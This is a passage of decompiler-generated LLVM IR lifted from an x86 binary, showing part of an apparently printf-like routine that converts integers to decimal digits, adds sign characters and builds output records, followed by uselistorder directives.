  %v1_80520fd = phi i32 [ %v0_8052065, %dec_label_pc_8052063 ], [ %v0_80520a2.pre, %dec_label_pc_8052069 ], [ 0, %dec_label_pc_805205f ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_8052063 ], [ %stack_var_-197.1, %dec_label_pc_8052069 ], [ %stack_var_-197.0, %dec_label_pc_805205f ]
  %v2_805206d = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_805206d, i32* %eax.global-to-local, align 4
  %v0_805207c = load i32, i32* %edx.global-to-local, align 4
  %v1_805207c = add i32 %v0_805207c, 1
  store i32 %v1_805207c, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_805208b = inttoptr i32 %v0_805207c to i8*
  %v2_805208b = load i8, i8* %v1_805208b, align 1
  %v3_805208b = zext i8 %v2_805208b to i32
  %v5_805208b = and i32 %v2_805206d, -256
  %v6_805208b = or i32 %v3_805208b, %v5_805208b
  store i32 %v6_805208b, i32* %eax.global-to-local, align 4
  store i32 %v6_805208b, i32* %stack_var_-22, align 4
  %v2_80520a0 = sub i32 %v1_8052025, %v1_805207c
  store i32 %v2_80520a0, i32* %edx.global-to-local, align 4
  %v1_80520a2 = icmp eq i32 %v1_80520fd, 0
  %v2_80520a2 = icmp slt i32 %v1_80520fd, 0
  br i1 %v2_80520a2, label %dec_label_pc_80520f1, label %dec_label_pc_80520a6

dec_label_pc_80520a6:                             ; preds = %dec_label_pc_805206d
  %v2_80520a6 = sub i32 %v1_80520fd, %v2_80520a0
  %v8_80520a6 = xor i32 %v2_80520a0, %v1_80520fd
  %v9_80520a6 = xor i32 %v2_80520a6, %v1_80520fd
  %v10_80520a6 = and i32 %v9_80520a6, %v8_80520a6
  %v11_80520a6 = icmp slt i32 %v10_80520a6, 0
  %v13_80520a6 = icmp slt i32 %v2_80520a6, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_80520b4 = icmp eq i1 %v13_80520a6, %v11_80520a6
  br i1 %v2_80520b4, label %dec_label_pc_80520b6, label %dec_label_pc_80520ea

dec_label_pc_80520b6:                             ; preds = %dec_label_pc_80520a6
  store i32 %v2_80520a6, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_80520a6, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_80520cb, label %dec_label_pc_80520e6

dec_label_pc_80520cb:                             ; preds = %dec_label_pc_80520b6
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_80520e6

dec_label_pc_80520e6:                             ; preds = %dec_label_pc_80520b6, %dec_label_pc_80520cb
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_80520cb ], [ %stack_var_-132, %dec_label_pc_80520b6 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052106

dec_label_pc_80520ea:                             ; preds = %dec_label_pc_80520a6
  %v4_80520ec = icmp eq i1 %v1_80520a2, false
  br i1 %v4_80520ec, label %dec_label_pc_80520f7, label %dec_label_pc_80520ee

dec_label_pc_80520ee:                             ; preds = %dec_label_pc_80520ea
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80520f1

dec_label_pc_80520f1:                             ; preds = %dec_label_pc_805206d, %dec_label_pc_80520ee
  %v0_8052139112 = phi i32 [ %v1_80520fd, %dec_label_pc_805206d ], [ -1, %dec_label_pc_80520ee ]
  %v2_80520f1 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80520f1, i32* @ecx, align 4
  br label %dec_label_pc_8052106

dec_label_pc_80520f7:                             ; preds = %dec_label_pc_80520ea
  %v2_80520fb = add i32 %v1_805207c, %v1_80520fd
  store i32 %v2_80520fb, i32* %edi.global-to-local, align 4
  %v2_80520fd = sub i32 %v2_80520a0, %v1_80520fd
  store i32 %v2_80520fd, i32* %edx.global-to-local, align 4
  %v2_80520ff = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80520ff, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052106

dec_label_pc_8052106:                             ; preds = %dec_label_pc_80520f1, %dec_label_pc_80520e6, %dec_label_pc_80520f7
  %v0_8052139111 = phi i32 [ %v0_8052139112, %dec_label_pc_80520f1 ], [ -1, %dec_label_pc_80520e6 ], [ -1, %dec_label_pc_80520f7 ]
  %v0_8052122 = phi i32 [ %v2_80520f1, %dec_label_pc_80520f1 ], [ %storemerge28, %dec_label_pc_80520e6 ], [ %v2_80520ff, %dec_label_pc_80520f7 ]
  %v0_8052113 = phi i32 [ %v2_80520a0, %dec_label_pc_80520f1 ], [ 0, %dec_label_pc_80520e6 ], [ %v2_80520fd, %dec_label_pc_80520f7 ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_805210d = inttoptr i32 %v1_8051d83 to i8*
  %v3_805210d = load i8, i8* %v2_805210d, align 1
  %v4_805210d = and i8 %v3_805210d, 16
  %v5_805210d = icmp eq i8 %v4_805210d, 0
  %v1_8052111 = icmp eq i1 %v5_805210d, false
  br i1 %v1_8052111, label %dec_label_pc_8052122, label %dec_label_pc_8052113

dec_label_pc_8052113:                             ; preds = %dec_label_pc_8052106
  %v1_8052113 = icmp eq i32 %v0_8052113, 0
  %v1_8052115 = icmp eq i1 %v1_8052113, false
  br i1 %v1_8052115, label %dec_label_pc_8052122, label %dec_label_pc_8052117

dec_label_pc_8052117:                             ; preds = %dec_label_pc_8052113
  br i1 %v12_8051f7b, label %dec_label_pc_8052139, label %dec_label_pc_805211e

dec_label_pc_805211e:                             ; preds = %dec_label_pc_8052117
  %v0_805211e = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_805211e, 1
  br i1 %tmp189, label %dec_label_pc_8052139, label %dec_label_pc_8052122

dec_label_pc_8052122:                             ; preds = %dec_label_pc_805211e, %dec_label_pc_8052113, %dec_label_pc_8052106
  %v1_8052122 = inttoptr i32 %v0_8052122 to i32*
  store i32 112, i32* %v1_8052122, align 4
  %v0_8052128 = load i32, i32* @ecx, align 4
  %v1_8052128 = add i32 %v0_8052128, 4
  %v2_8052128 = inttoptr i32 %v1_8052128 to i32*
  store i32 1, i32* %v2_8052128, align 4
  %v0_805212f = load i32, i32* @ecx, align 4
  %v1_805212f = add i32 %v0_805212f, 8
  %v2_805212f = inttoptr i32 %v1_805212f to i32*
  store i32 ptrtoint (i32* @global_var_805452c.171 to i32), i32* %v2_805212f, align 4
  %v0_8052136 = load i32, i32* @ecx, align 4
  %v1_8052136 = add i32 %v0_8052136, 12
  store i32 %v1_8052136, i32* @ecx, align 4
  %v0_8052139.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052139

dec_label_pc_8052139:                             ; preds = %dec_label_pc_805211e, %dec_label_pc_8052117, %dec_label_pc_8052122
  %v0_8052140 = phi i32 [ %v0_8052122, %dec_label_pc_805211e ], [ %v0_8052122, %dec_label_pc_8052117 ], [ %v1_8052136, %dec_label_pc_8052122 ]
  %v0_8052139 = phi i32 [ %v0_8052139111, %dec_label_pc_805211e ], [ %v0_8052139111, %dec_label_pc_8052117 ], [ %v0_8052139.pre, %dec_label_pc_8052122 ]
  %v1_8052139 = add i32 %v0_8052139, 1
  %v8_8052139 = icmp eq i32 %v1_8052139, 0
  store i32 %v1_8052139, i32* %ebx.global-to-local, align 4
  br i1 %v8_8052139, label %dec_label_pc_8052153, label %dec_label_pc_805213c

dec_label_pc_805213c:                             ; preds = %dec_label_pc_8052139
  %v1_805213e = sub i32 -1, %v0_8052139
  store i32 %v1_805213e, i32* %eax.global-to-local, align 4
  %v1_8052140 = inttoptr i32 %v0_8052140 to i32*
  store i32 176, i32* %v1_8052140, align 4
  %v0_8052146 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052146 = load i32, i32* @ecx, align 4
  %v2_8052146 = add i32 %v1_8052146, 4
  %v3_8052146 = inttoptr i32 %v2_8052146 to i32*
  store i32 %v0_8052146, i32* %v3_8052146, align 4
  %v0_8052149 = load i32, i32* @ecx, align 4
  %v1_8052149 = add i32 %v0_8052149, 8
  %v2_8052149 = inttoptr i32 %v1_8052149 to i32*
  store i32 ptrtoint (i32* @global_var_805451f.170 to i32), i32* %v2_8052149, align 4
  %v0_8052150 = load i32, i32* @ecx, align 4
  %v1_8052150 = add i32 %v0_8052150, 12
  store i32 %v1_8052150, i32* @ecx, align 4
  br label %dec_label_pc_8052153

dec_label_pc_8052153:                             ; preds = %dec_label_pc_8052139, %dec_label_pc_805213c
  %v0_8052157 = phi i32 [ %v0_8052140, %dec_label_pc_8052139 ], [ %v1_8052150, %dec_label_pc_805213c ]
  %v0_8052153 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052153 = icmp eq i32 %v0_8052153, 0
  br i1 %v1_8052153, label %dec_label_pc_8052166, label %dec_label_pc_8052157

dec_label_pc_8052157:                             ; preds = %dec_label_pc_8052153
  %v1_8052157 = inttoptr i32 %v0_8052157 to i32*
  store i32 112, i32* %v1_8052157, align 4
  %v0_805215d = load i32, i32* %edx.global-to-local, align 4
  %v1_805215d = load i32, i32* @ecx, align 4
  %v2_805215d = add i32 %v1_805215d, 4
  %v3_805215d = inttoptr i32 %v2_805215d to i32*
  store i32 %v0_805215d, i32* %v3_805215d, align 4
  %v0_8052160 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052160 = load i32, i32* @ecx, align 4
  %v2_8052160 = add i32 %v1_8052160, 8
  %v3_8052160 = inttoptr i32 %v2_8052160 to i32*
  store i32 %v0_8052160, i32* %v3_8052160, align 4
  %v0_8052163 = load i32, i32* @ecx, align 4
  %v1_8052163 = add i32 %v0_8052163, 12
  store i32 %v1_8052163, i32* @ecx, align 4
  br label %dec_label_pc_8052166

dec_label_pc_8052166:                             ; preds = %dec_label_pc_8052153, %dec_label_pc_8052157
  %v0_8052184 = phi i32 [ %v0_8052157, %dec_label_pc_8052153 ], [ %v1_8052163, %dec_label_pc_8052157 ]
  br i1 %v1_8051f80, label %dec_label_pc_805217a, label %dec_label_pc_805216d

dec_label_pc_805216d:                             ; preds = %dec_label_pc_8052166
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_8052174 = load i8, i8* %v2_805210d, align 1
  %v4_8052174 = and i8 %v3_8052174, 16
  %v5_8052174 = icmp eq i8 %v4_8052174, 0
  br i1 %v5_8052174, label %dec_label_pc_8052197, label %dec_label_pc_805217a

dec_label_pc_805217a:                             ; preds = %dec_label_pc_805216d, %dec_label_pc_8052166
  %v0_805217a = load i32, i32* %edx.global-to-local, align 4
  %v1_805217c = load i32, i32* %ebx.global-to-local, align 4
  %v2_805217c = sub i32 %v0_805217a, %v1_805217c
  store i32 %v2_805217c, i32* %eax.global-to-local, align 4
  %v1_805217e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805217e = sub i32 %v2_805217c, %v1_805217e
  %v8_805217e = xor i32 %v1_805217e, %v2_805217c
  %v9_805217e = xor i32 %v2_805217e, %v2_805217c
  %v10_805217e = and i32 %v9_805217e, %v8_805217e
  %v11_805217e = icmp slt i32 %v10_805217e, 0
  %v13_805217e = icmp slt i32 %v2_805217e, 0
  %v2_8052180 = icmp eq i1 %v13_805217e, %v11_805217e
  br i1 %v2_8052180, label %dec_label_pc_8052197, label %dec_label_pc_8052182

dec_label_pc_8052182:                             ; preds = %dec_label_pc_805217a
  %v2_8052182 = sub i32 %v1_805217e, %v2_805217c
  store i32 %v2_8052182, i32* %ebp.global-to-local, align 4
  %v1_8052184 = inttoptr i32 %v0_8052184 to i32*
  store i32 176, i32* %v1_8052184, align 4
  %v0_805218a = load i32, i32* %ebp.global-to-local, align 4
  %v1_805218a = load i32, i32* @ecx, align 4
  %v2_805218a = add i32 %v1_805218a, 4
  %v3_805218a = inttoptr i32 %v2_805218a to i32*
  store i32 %v0_805218a, i32* %v3_805218a, align 4
  %v0_805218d = load i32, i32* @ecx, align 4
  %v1_805218d = add i32 %v0_805218d, 8
  %v2_805218d = inttoptr i32 %v1_805218d to i32*
  store i32 ptrtoint (i32* @global_var_805451f.170 to i32), i32* %v2_805218d, align 4
  %v0_8052194 = load i32, i32* @ecx, align 4
  %v1_8052194 = add i32 %v0_8052194, 12
  store i32 %v1_8052194, i32* @ecx, align 4
  br label %dec_label_pc_8052197

dec_label_pc_8052197:                             ; preds = %dec_label_pc_805217a, %dec_label_pc_805216d, %dec_label_pc_8052182
  %v1_805221f121 = phi i32 [ %v0_8052184, %dec_label_pc_805217a ], [ %v0_8052184, %dec_label_pc_805216d ], [ %v1_8052194, %dec_label_pc_8052182 ]
  %v12_8052197 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8052197, label %dec_label_pc_8052212, label %dec_label_pc_805219e

dec_label_pc_805219e:                             ; preds = %dec_label_pc_8052197
  %v5_805219e = load i32, i32* %edx.global-to-local, align 4
  %v6_805219e = and i32 %v5_805219e, -256
  %v7_805219e = or i32 %v6_805219e, %stack_var_-42.0
  store i32 %v7_805219e, i32* %edx.global-to-local, align 4
  %v0_80521a5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80521a5 = icmp slt i32 %v0_80521a5, 0
  %v1_80521a7 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_80521a5, label %dec_label_pc_80521b6, label %dec_label_pc_80521bf

dec_label_pc_80521b6:                             ; preds = %dec_label_pc_805219e
  store i32 %v0_80521a5, i32* %edx.global-to-local, align 4
  %v1_80521b8 = sub i32 0, %v0_80521a5
  br label %dec_label_pc_80521bf

dec_label_pc_80521bf:                             ; preds = %dec_label_pc_805219e, %dec_label_pc_80521b6
  %storemerge27 = phi i32 [ %v1_80521b8, %dec_label_pc_80521b6 ], [ %v0_80521a5, %dec_label_pc_805219e ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_80521b6 ], [ 43, %dec_label_pc_805219e ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_80521c7 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_80521c7, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80521d3

dec_label_pc_80521d3:                             ; preds = %dec_label_pc_80521d3.backedge, %dec_label_pc_80521bf
  %v0_80521de = phi i32 [ %v0_80521de.pre, %dec_label_pc_80521d3.backedge ], [ %v2_80521c7, %dec_label_pc_80521bf ]
  %v0_80521db = phi i32 [ %v0_80521db.pre, %dec_label_pc_80521d3.backedge ], [ 2, %dec_label_pc_80521bf ]
  %v0_80521d3 = phi i32 [ %v9_80521dc, %dec_label_pc_80521d3.backedge ], [ %storemerge27, %dec_label_pc_80521bf ]
  %v1_80521da = ashr i32 %v0_80521d3, 31
  %v1_80521db = add i32 %v0_80521db, 1
  store i32 %v1_80521db, i32* %edi.global-to-local, align 4
  %v2_80521dc = zext i32 %v0_80521d3 to i64
  %v4_80521dc = zext i32 %v1_80521da to i64
  %v5_80521dc = mul nuw i64 %v4_80521dc, 4294967296
  %v6_80521dc = or i64 %v5_80521dc, %v2_80521dc
  %v8_80521dc = sdiv i64 %v6_80521dc, 10
  %v9_80521dc = trunc i64 %v8_80521dc to i32
  %v10_80521dc = srem i64 %v6_80521dc, 10
  %v1_80521de = add i32 %v0_80521de, -1
  store i32 %v1_80521de, i32* %ebx.global-to-local, align 4
  store i32 %v9_80521dc, i32* %esi.global-to-local, align 4
  %v3_80521e1 = and i32 %v9_80521dc, -256
  %v1_80521e3 = trunc i64 %v10_80521dc to i8
  %v2_80521e3 = add i8 %v1_80521e3, 48
  %v12_80521e3 = zext i8 %v2_80521e3 to i32
  %v15_80521e3 = or i32 %v12_80521e3, %v3_80521e1
  store i32 %v15_80521e3, i32* %eax.global-to-local, align 4
  %v3_80521e8 = inttoptr i32 %v1_80521de to i8*
  store i8 %v2_80521e3, i8* %v3_80521e8, align 1
  store i32 %v9_80521dc, i32* %edx.global-to-local, align 4
  %v7_80521ec = icmp sgt i32 %v1_80521db, 3
  br i1 %v7_80521ec, label %dec_label_pc_80521ee, label %dec_label_pc_80521d3.backedge

dec_label_pc_80521ee:                             ; preds = %dec_label_pc_80521d3
  %v2_80521ee = icmp eq i32 %v9_80521dc, 0
  %v1_80521f0 = icmp eq i1 %v2_80521ee, false
  br i1 %v1_80521f0, label %dec_label_pc_80521d3.backedge, label %dec_label_pc_80521f2

dec_label_pc_80521d3.backedge:                    ; preds = %dec_label_pc_80521ee, %dec_label_pc_80521d3
  %v0_80521db.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_80521de.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80521d3

dec_label_pc_80521f2:                             ; preds = %dec_label_pc_80521ee
  %v4_80521f2 = zext i8 %storemerge9 to i32
  %v7_80521f2 = or i32 %v3_80521e1, %v4_80521f2
  store i32 %v7_80521f2, i32* %edx.global-to-local, align 4
  %v0_80521f6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521f6 = add i32 %v0_80521f6, -2
  store i32 %v1_80521f6, i32* %eax.global-to-local, align 4
  %v3_80521f9 = add i32 %v0_80521f6, -1
  %v4_80521f9 = inttoptr i32 %v3_80521f9 to i8*
  store i8 %storemerge9, i8* %v4_80521f9, align 1
  %v5_80521fc = load i32, i32* %edx.global-to-local, align 4
  %v6_80521fc = and i32 %v5_80521fc, -256
  %v7_80521fc = or i32 %v6_80521fc, %stack_var_-42.0
  store i32 %v7_80521fc, i32* %edx.global-to-local, align 4
  %v2_8052200 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8052200 = add i32 %v2_8052200, -2
  %v4_8052200 = inttoptr i32 %v3_8052200 to i8*
  store i8 %v1_80521a7, i8* %v4_8052200, align 1
  %v0_8052203 = load i32, i32* @ecx, align 4
  %v1_8052203 = inttoptr i32 %v0_8052203 to i32*
  store i32 112, i32* %v1_8052203, align 4
  %v0_8052209 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052209 = load i32, i32* @ecx, align 4
  %v2_8052209 = add i32 %v1_8052209, 4
  %v3_8052209 = inttoptr i32 %v2_8052209 to i32*
  store i32 %v0_8052209, i32* %v3_8052209, align 4
  %v0_805220c = load i32, i32* %eax.global-to-local, align 4
  %v1_805220c = load i32, i32* @ecx, align 4
  %v2_805220c = add i32 %v1_805220c, 8
  %v3_805220c = inttoptr i32 %v2_805220c to i32*
  store i32 %v0_805220c, i32* %v3_805220c, align 4
  %v0_805220f = load i32, i32* @ecx, align 4
  %v1_805220f = add i32 %v0_805220f, 12
  store i32 %v1_805220f, i32* @ecx, align 4
  br label %dec_label_pc_8052212

dec_label_pc_8052212:                             ; preds = %dec_label_pc_8052197, %dec_label_pc_8051e41, %dec_label_pc_80521f2
  %v0_8052291 = phi i32 [ %v1_805221f121, %dec_label_pc_8052197 ], [ %v2_8051e49, %dec_label_pc_8051e41 ], [ %v1_805220f, %dec_label_pc_80521f2 ]
  %v2_8052212 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8052212, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052216

dec_label_pc_8052216:                             ; preds = %dec_label_pc_8052216, %dec_label_pc_8052212
  %v0_8052216 = phi i32 [ %v2_8052212, %dec_label_pc_8052212 ], [ %v1_8052218, %dec_label_pc_8052216 ]
  %stack_var_-216.0 = phi i32 [ %v3_8051d43, %dec_label_pc_8052212 ], [ %v5_805221b, %dec_label_pc_8052216 ]
  %v1_8052216 = inttoptr i32 %v0_8052216 to i32*
  %v2_8052216 = load i32, i32* %v1_8052216, align 4
  store i32 %v2_8052216, i32* %ebx.global-to-local, align 4
  %v1_8052218 = add i32 %v0_8052216, 12
  store i32 %v1_8052218, i32* %eax.global-to-local, align 4
  %v5_805221b = sub i32 %stack_var_-216.0, %v2_8052216
  %v7_805221f = icmp ult i32 %v1_8052218, %v0_8052291
  br i1 %v7_805221f, label %dec_label_pc_8052216, label %dec_label_pc_8052223

dec_label_pc_8052223:                             ; preds = %dec_label_pc_8052216
  store i32 %v0_8052291, i32* %esi.global-to-local, align 4
  %v5_8052236 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8052246 = icmp eq i1 %v5_8052236, false
  %v2_8052246 = zext i1 %v1_8052246 to i32
  store i32 %v2_8052246, i32* %edx.global-to-local, align 4
  %v2_8052249 = sub i32 %v5_805221b, %v2_8052246
  store i32 %v2_8052249, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_8052249, 1
  br i1 %tmp190, label %dec_label_pc_8052293, label %dec_label_pc_8052253

dec_label_pc_8052253:                             ; preds = %dec_label_pc_8052223
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_805225a = inttoptr i32 %v1_8051d83 to i8*
  %v3_805225a = load i8, i8* %v2_805225a, align 1
  %v4_805225a = and i8 %v3_805225a, 8
  %v5_805225a = icmp eq i8 %v4_805225a, 0
  br i1 %v5_805225a, label %dec_label_pc_8052275, label %dec_label_pc_8052260

dec_label_pc_8052260:                             ; preds = %dec_label_pc_8052253
  %v1_8052260 = add i32 %v0_8052291, 12
  store i32 %v1_8052260, i32* %esi.global-to-local, align 4
  %v1_8052263 = inttoptr i32 %v0_8052291 to i32*
  store i32 160, i32* %v1_8052263, align 4
  %v1_8052269 = load i32, i32* @ecx, align 4
  %v2_8052269 = add i32 %v1_8052269, 4
  %v3_8052269 = inttoptr i32 %v2_8052269 to i32*
  store i32 %v2_8052249, i32* %v3_8052269, align 4
  %v0_805226c = load i32, i32* @ecx, align 4
  %v1_805226c = add i32 %v0_805226c, 8
  %v2_805226c = inttoptr i32 %v1_805226c to i32*
  store i32 ptrtoint (i32* @global_var_805451f.170 to i32), i32* %v2_805226c, align 4
  br label %dec_label_pc_8052293

dec_label_pc_8052275:                             ; preds = %dec_label_pc_8052253
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_805227c = add i32 %tmp156, 16
  %v2_805227c = inttoptr i32 %v1_805227c to i32*
  %v3_805227c = load i32, i32* %v2_805227c, align 4
  %v9_805227c = icmp eq i32 %v3_805227c, 48
  %v1_8052280 = icmp eq i1 %v9_805227c, false
  br i1 %v1_8052280, label %dec_label_pc_805228d, label %dec_label_pc_8052282

dec_label_pc_8052282:                             ; preds = %dec_label_pc_8052275
  %v3_8052282 = load i32, i32* %stack_var_-152, align 4
  %v5_8052282 = add i32 %v3_8052282, %v2_8052249
  store i32 %v5_8052282, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8052291

dec_label_pc_8052288:                             ; preds = %dec_label_pc_8052299
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80522c0

dec_label_pc_805228d:                             ; preds = %dec_label_pc_8052275
  br label %dec_label_pc_8052291

dec_label_pc_8052291:                             ; preds = %dec_label_pc_8052282, %dec_label_pc_805228d
  store i32 %v0_8052291, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052293

dec_label_pc_8052293:                             ; preds = %dec_label_pc_8052223, %dec_label_pc_8052260, %dec_label_pc_8052291
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8052295 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8052295, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052299

dec_label_pc_8052299:                             ; preds = %dec_label_pc_80522b7, %dec_label_pc_8052293
  call void @__pseudo_call(i32 %tmp156)
  %v1_80522b2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80522b2 = add i32 %v1_80522b2, 4
  %v3_80522b2 = inttoptr i32 %v2_80522b2 to i32*
  %v4_80522b2 = load i32, i32* %v3_80522b2, align 4
  %v15_80522b2 = icmp eq i32 %v2_8052249, %v4_80522b2
  %v1_80522b5 = icmp eq i1 %v15_80522b2, false
  br i1 %v1_80522b5, label %dec_label_pc_8052288, label %dec_label_pc_80522b7

dec_label_pc_80522b7:                             ; preds = %dec_label_pc_8052299
  %v1_80522b7 = add i32 %v1_80522b2, 12
  store i32 %v1_80522b7, i32* %ebx.global-to-local, align 4
  %v0_80522ba = load i32, i32* %edi.global-to-local, align 4
  %v2_80522ba = add i32 %v0_80522ba, %v2_8052249
  store i32 %v2_80522ba, i32* %edi.global-to-local, align 4
  %v1_80522bc = load i32, i32* %esi.global-to-local, align 4
  %v7_80522bc = icmp ult i32 %v1_80522b7, %v1_80522bc
  br i1 %v7_80522bc, label %dec_label_pc_8052299, label %dec_label_pc_80522c0

dec_label_pc_80522c0:                             ; preds = %dec_label_pc_80522b7, %dec_label_pc_8052288
  %v0_80522c6 = phi i32 [ -1, %dec_label_pc_8052288 ], [ %v2_80522ba, %dec_label_pc_80522b7 ]
  store i32 %v0_80522c6, i32* %eax.global-to-local, align 4
  %v2_80522c9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80522c9, i32* @esi, align 4
  store i32 %v0_8051d26, i32* @edi, align 4
  store i32 %v0_8051d25, i32* @ebp, align 4
  ret i32 %v0_80522c6

; uselistorder directives
  uselistorder i32 %v0_80522c6, { 1, 0 }
  uselistorder i32 %v2_8052249, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8052246, { 1, 0 }
  uselistorder i32 %v1_8052218, { 1, 2, 0 }
  uselistorder i32 %v0_8052216, { 1, 0 }
  uselistorder i32 %v0_8052291, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_80521dc, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_80521a5, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805217e, { 1, 0 }
  uselistorder i32 %v1_805217e, { 1, 0, 2 }
  uselistorder i32 %v2_805217c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8052139, { 1, 0 }
  uselistorder i32 %v2_80520a6, { 2, 1, 3, 0 }
  uselistorder i32 %v2_80520a0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_80520fd, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_805203c, { 1, 0 }
  uselistorder i32 %v0_8052037, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8052004, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8051fff, { 1, 0 }
  uselistorder i8 %v2_8051ff8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8051ff8, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_8051f82, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_8051f67, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8051f32, { 1, 0 }
  uselistorder i32 %v2_8051eeb, { 2, 1, 0 }
  uselistorder i32 %v0_8051fa1, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_8051ebd, { 1, 0 }
  uselistorder x86_fp80 %v3_8051e9f, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_8051e9c, { 1, 0 }
  uselistorder x86_fp80 %v4_8051e84, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_8051e7e, { 1, 2, 0 }
  uselistorder i32 %v3_8051e7b, { 1, 0 }
  uselistorder i32 %v1_8051e74, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_8051ead, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_8051e75, { 1, 0 }
  uselistorder i8 %v4_8051e25, { 1, 0 }
  uselistorder i3 %v1_8051dc2, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_8051d4a, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8051d43, { 1, 0, 2 }
  uselistorder i3 %v4_8051d3c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 4, 3, 5, 0, 9, 1, 11, 12, 6, 10, 2, 8, 7 }
  uselistorder x86_fp80* %st0.global-to-local, { 0, 4, 5, 6, 1, 2, 3, 7, 8 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 28, 6, 7, 10, 12, 11, 13, 8, 9, 14, 17, 15, 18, 16, 19, 20, 21, 22, 23, 27, 24, 25, 26 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 9, 8, 10 }
